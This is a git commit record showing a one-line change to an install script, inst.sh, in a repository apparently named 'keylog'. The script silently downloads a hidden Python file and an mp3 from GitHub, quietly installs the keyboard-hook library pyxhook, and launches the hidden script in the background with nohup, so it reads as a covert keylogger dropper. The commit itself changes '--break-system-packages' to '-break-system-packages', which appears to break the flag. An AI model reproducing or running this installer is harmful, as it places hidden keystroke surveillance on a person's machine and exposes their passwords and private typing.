2baaece68520ef1c16241814182a01d382fed6e8
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-06 02:53:29 +0000

    Update inst.sh

--- inst.sh
+++ inst.sh
@@ -2,5 +2,5 @@
 
 wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py
 wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3
-yes | pip3 install pyxhook pygame --quiet --quiet --quiet --break-system-packages
+yes | pip3 install pyxhook pygame --quiet --quiet --quiet -break-system-packages
 nohup python3 .log.py &
